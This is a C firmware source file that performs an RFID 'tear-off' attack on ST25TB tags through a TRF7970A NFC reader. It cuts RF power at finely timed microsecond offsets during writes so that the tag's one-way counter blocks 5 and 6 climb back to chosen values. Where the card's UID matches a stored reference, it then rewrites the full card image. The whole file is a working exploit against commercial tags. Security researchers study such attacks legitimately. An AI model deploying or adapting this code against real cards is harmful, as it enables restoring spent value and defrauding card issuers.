/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
    ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ----
    Tear off code logic below is 99.9% by:
    `SecLabz` from his near-field-chaos project
    https://github.com/SecLabz/near-field-chaos
*/
#include "tear.h"
#include "../references.h"

uint32_t st25tb_tear_off_next_value(uint32_t current_value, bool randomness);
uint8_t st25tb_tear_off_retry_write_verify(const uint8_t block_address, uint32_t target_value, uint32_t max_try_count, uint32_t *new_value);
uint8_t st25tb_tear_off_is_consolidated(const uint8_t block_address, uint32_t value, int repeat_read, int sleep_time_ms, uint32_t *read_value);
uint8_t st25tb_tear_off_consolidate_block(const uint8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t *read_back_value);
//void st25tb_tear_off_log(int tear_off_us, char *color, uint32_t value);
void st25tb_tear_off_adjust_timing(int *tear_off_us, uint32_t tear_off_adjustment_us);
bool st25tb_tear_off(const uint8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t tear_off_adjustment_us);

bool MODE_tear_Counter(const uint8_t counter, const uint32_t current, uint32_t target)
{
    bool ret;
    uint8_t led_index = (counter == ST25TB_IDX_COUNTER1) ? 0 : 1;

    if(current < target)
    {
        LED_OFF(led_index);
        //LED_ON(NB_LEDS_MODES + (counter - (6 - counter)));

        ret = st25tb_tear_off(counter, current, target, 0);

        //LEDS_Bitmask(LEDS_SLOTS, NB_LEDS_SLOTS - 4, 0);
        LEDS_STATUS_Bitmask(0b000);
        if(ret)
        {
            LED_ON(led_index);
            //LED_ON(NB_LEDS_MODES + (counter + (counter - 5)));
        }
    }
    else
    {
        ret = true;
    }

    return ret;
}

void MODE_tear()
{
    bool retS5, retS6;
    uint8_t BP_IrqSource = IRQ_SOURCE_SW2, UID[8], bInRef;
    uint32_t c_sector5 = 0, c_sector6 = 0, t_sector5, t_sector6;

    do
    {
        if(BP_IrqSource == IRQ_SOURCE_SW2) // to deal with first start and restart
        {
            ST25TB_TRF7970A_Mode(true);
            LEDS_STATUS_Bitmask(0b000);
            //LEDS_SLOTS_Bitmask(0b00000000);
        }

        BP_IrqSource = IRQ_Wait_for(IRQ_SOURCE_SW1 | IRQ_SOURCE_SW2 | IRQ_SOURCE_TIMER, NULL, ST25TB_INITIATOR_DELAY_BEFORE_RETRY);
        if(BP_IrqSource & IRQ_SOURCE_TIMER)
        {
            LED_ON(LED_INDEX_STATUS_BLUE);
            BP_IrqSource = ST25TB_Initiator_Initiate_Select_UID_C1_C2(UID, (uint8_t *) &c_sector5, (uint8_t *) &c_sector6);
            LED_OFF(LED_INDEX_STATUS_BLUE);

            if(BP_IrqSource == IRQ_SOURCE_NONE)
            {
                if((*(uint64_t*) UID) == (*(uint64_t*) SLOTS_ST25TB_Current[SLOTS_ST25TB_INDEX_UID]))
                {
                    bInRef = 1;
                }
                else
                {
#if defined(REFERENCES_DATA_READY)
                    bInRef = REFERENCES_FindAndLoadByUID(UID);
#else
                    bInRef = 0;
#endif
                }

                if(bInRef)
                {
                    t_sector5 = *(uint32_t *) SLOTS_ST25TB_Current[ST25TB_IDX_COUNTER1];
                    t_sector6 = *(uint32_t *) SLOTS_ST25TB_Current[ST25TB_IDX_COUNTER2];
                }
                else
                {
                    t_sector5 = t_sector6 = 0xfffffffe;
                    //t_sector5 = 0x04000009;
                    //t_sector6 = 0xfffffffd;
                }

                retS5 = MODE_tear_Counter(ST25TB_IDX_COUNTER1, c_sector5, t_sector5);
                retS6 = MODE_tear_Counter(ST25TB_IDX_COUNTER2, c_sector6, t_sector6);

                if(retS5 && retS6)
                {
                    LED_ON(LED_INDEX_STATUS_GREEN);

                    if(bInRef)
                    {
                        ST25TB_TRF7970A_Mode(true);
                        BP_IrqSource = ST25TB_Initiator_Write_Current_Card();
                        if(BP_IrqSource == IRQ_SOURCE_NONE)
                        {
                            LED_ON(LED_INDEX_STATUS_BLUE);
                        }
                        else
                        {
                            LED_ON(LED_INDEX_STATUS_RED);
                        }
                    }
                }
                else
                {
                    LED_ON(LED_INDEX_STATUS_RED);
                }

                TRF7970A_SPI_Write_SingleRegister(TRF79X0_CHIP_STATUS_CTRL_REG, 0x00); // if we let it run on battery :')

                if(bInRef)
                {
                    SLOTS_Load_Current();
                }

                BP_IrqSource = IRQ_Wait_for(IRQ_SOURCE_SW1 | IRQ_SOURCE_SW2, NULL, 0);
            }
        }
    }
    while (!(BP_IrqSource & IRQ_SOURCE_SW1));

    LED_Slot(FlashStoredData.CurrentSlot);
}


#define TEAR_SPECIFIC_PRE_TIMER -20
#define TIMER_Tear_DelayMicroseconds(x) TIMER_delay_Microseconds(TEAR_SPECIFIC_PRE_TIMER + (x))

#define TEAR_OFF_START_OFFSET_US    90
#define TEAR_OFF_ADJUSTMENT_US      25

uint32_t st25tb_tear_off_next_value(uint32_t current_value, bool randomness)
{
    int8_t i;
    uint32_t svalue;

    for (i = 31; i >= 16 ; i--) // prevent to go to very dangerous value here :)
    {
        if(current_value & ((uint32_t)1 << i)) // search first '1'
        {
            svalue = (uint32_t)(~0) >> (31 - i);

            for (i--; i >= 0; i--)
            {
                if (!(current_value & ((uint32_t)1 << i))) // search first '0', after the first '1'
                {
                    break;
                }
            }

            i++; // also dealing with -1 here
            svalue &= ~((uint32_t)1 << i);

            // Set a random bit to zero to help flipping
            if (randomness && (svalue < 0xf0000000) && (i > 1))
            {
                svalue ^= ((uint32_t)1 << (RAND_Generate() % i));
            }

            return svalue;
        }
    }

    return 0;
}

uint8_t st25tb_tear_off_retry_write_verify(const uint8_t block_address, uint32_t target_value, uint32_t max_try_count, uint32_t *read_back_value)
{
    uint32_t i = 0;

    for(i = 0; (i < max_try_count) && (*read_back_value != target_value); i++)
    {
        ST25TB_Initiator_CMD_Write_Block(block_address, (const uint8_t *) &target_value);
        ST25TB_Initiator_CMD_Read_Block(block_address, (uint8_t *) read_back_value);
    }

    return (*read_back_value == target_value);
}

uint8_t st25tb_tear_off_is_consolidated(const uint8_t block_address, uint32_t value, int repeat_read, int sleep_time_ms, uint32_t *read_value)
{
    uint8_t result, i;

    for (i = 0; i < repeat_read; i++)
    {
        TIMER_delay_Milliseconds(sleep_time_ms);
        result = (ST25TB_Initiator_CMD_Read_Block(block_address, (uint8_t *) read_value) == IRQ_SOURCE_NONE);
        if(!result || (value != *read_value))
        {
            return 0;
        }
    }

    return 1;
}

uint8_t st25tb_tear_off_consolidate_block(const uint8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t *read_back_value)
{
    uint8_t result, bAdjusted;

    if ((target_value <= 0xfffffffd) && (current_value >= (target_value + 2)))
    {
        target_value += 2;
        bAdjusted = 1;
    }
    else
    {
        target_value = current_value;
        bAdjusted = 0;
    }

    result = st25tb_tear_off_retry_write_verify(block_address, target_value - 1, 30, read_back_value);
    if (!result)
    {
        return 0;
    }

    if ((*read_back_value < 0xfffffffe) || bAdjusted)
    {
        result = st25tb_tear_off_retry_write_verify(block_address, target_value - 2, 30, read_back_value);
        if (!result)
        {
            return 0;
        }
    }

    if ((target_value >= 0xfffffffd) && (*read_back_value >= 0xfffffffd))
    {
        result = st25tb_tear_off_is_consolidated(block_address, *read_back_value, 6, 10, read_back_value);
        if (result)
        {
            result = st25tb_tear_off_is_consolidated(block_address, *read_back_value, 2, 2000, read_back_value);
            if (!result)
            {
                return 0;
            }
        }
    }

    return 1;
}


void st25tb_tear_off_adjust_timing(int *tear_off_us, uint32_t tear_off_adjustment_us)
{
    if (*tear_off_us > TEAR_OFF_START_OFFSET_US)
    {
        *tear_off_us -= tear_off_adjustment_us;
    }
}

bool st25tb_tear_off(const uint8_t block_address, uint32_t current_value, uint32_t target_value, uint32_t tear_off_adjustment_us)
{
    uint8_t result;
    bool trigger = true;

    uint8_t led_index = (block_address == ST25TB_IDX_COUNTER1) ? 0 : 1, led_cnt = 0; //
    uint32_t read_value, last_consolidated_value = 0, tear_off_value;

    int tear_off_us = TEAR_OFF_START_OFFSET_US;
    if (tear_off_adjustment_us == 0)
    {
        tear_off_adjustment_us = TEAR_OFF_ADJUSTMENT_US;
    }

    tear_off_value = st25tb_tear_off_next_value(current_value, false);

    if (tear_off_value == 0)
    {
        return false;
    }

    while (true)
    {
        // Fail safe
        if (tear_off_value < 0x00100000)
        {
            return false;
        }

        // Tear off write
        ST25TB_Initiator_CMD_Write_Block_noflush_notimer(block_address, (const uint8_t *) &tear_off_value);
        TIMER_Tear_DelayMicroseconds(tear_off_us);
        TRF7970A_SPI_Write_SingleRegister(TRF79X0_CHIP_STATUS_CTRL_REG, 0x00);
        TIMER_delay_Microseconds(700);
        TRF7970A_SPI_Write_SingleRegister(TRF79X0_CHIP_STATUS_CTRL_REG, TRF79X0_STATUS_CTRL_RF_ON);
        TIMER_delay_Microseconds(700);
        result = (ST25TB_Initiator_Initiate_Select_Read_Block(block_address, (uint8_t *) &read_value) == IRQ_SOURCE_NONE);
        if (!result)
        {
            continue;
        }

        // Part to make accurate external measure
        // (void) trigger;
        // (void) leds_bits;
        // (void) last_consolidated_value;
        // TRF7970A_SPI_Write_SingleRegister(TRF79X0_CHIP_STATUS_CTRL_REG, 0x00);
        // while(1);

        // Act
        if (read_value > current_value)
        {
            if ((read_value >= 0xfffffffe) || ((read_value - 2) > target_value) || (read_value != last_consolidated_value) || ((read_value & 0xf0000000) > (current_value & 0xf0000000)))
            {
                result = st25tb_tear_off_consolidate_block(block_address, read_value, target_value, &current_value);
                if (result && (current_value == target_value))
                {
                    return true;
                }
                if (read_value != last_consolidated_value)
                {
                    st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
                }
                last_consolidated_value = read_value;
                tear_off_value = st25tb_tear_off_next_value(current_value, false);
                trigger = true;
                LEDS_STATUS_Bitmask(0b100);//0b010);
            }
        }
        else if (read_value == tear_off_value)
        {
            tear_off_value = st25tb_tear_off_next_value(read_value, trigger);
            trigger = !trigger;
            current_value = read_value;
            st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
            LEDS_STATUS_Bitmask(0b001);
        }
        else if (read_value < tear_off_value)
        {
            tear_off_value = st25tb_tear_off_next_value(read_value, false);
            trigger = true;
            current_value = read_value;
            st25tb_tear_off_adjust_timing(&tear_off_us, tear_off_adjustment_us);
            LEDS_STATUS_Bitmask(0b010);//0b100);
        }

        tear_off_us++;

        if(led_cnt == 0x10) //& 0b00010000)
        {
            LED_ON(led_index);
        }
        else if(led_cnt == 0x20)
        {
            LED_OFF(led_index);
            led_cnt = 0;
        }
        led_cnt++;
    }

}
